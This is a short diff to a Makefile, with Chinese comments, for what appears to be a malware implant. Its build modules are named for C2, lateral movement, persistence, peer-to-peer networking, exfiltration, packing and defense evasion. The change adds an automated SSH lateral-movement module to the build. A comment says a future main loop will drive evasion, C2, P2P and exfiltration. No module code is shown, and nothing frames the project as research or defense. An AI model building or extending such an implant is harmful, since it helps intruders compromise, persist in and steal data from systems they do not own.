@@ -13,10 +13,14 @@ CFLAGS  = -std=c11 -O2 -Wall -Wextra -D_GNU_SOURCE -fvisibility=hidden
 #   待 main.c 写成真实主循环（真正驱动 defense->c2->p2p->exfil）后再启用。
 LDFLAGS =
 
-MODS    = 00_crypto 02_c2 08_lateral 09_persistence 14_p2p 21_exfil 20_packer 19_defense
+MODS    = 00_crypto 02_c2 08_lateral 09_persistence 14_p2p 21_exfil 20_packer 19_defense 26_lateral_auto
 INC     = -Iinclude $(foreach m,$(MODS),-I../$(m)/include)
 SRCS    = $(foreach m,$(MODS),$(wildcard ../$(m)/src/*.c))
 OBJS    = $(patsubst ../%.c,obj/%.o,$(SRCS))
+
+# 26_lateral_auto 的 ssh 执行层要用 pipe2 / prctl 等，
+# 与 14_p2p 一样依赖 _GNU_SOURCE —— 由顶层 CFLAGS 统一提供，此处不再重复。
+$(shell mkdir -p obj/26_lateral_auto/src)
 
 all: implant obj/embedcfg
 
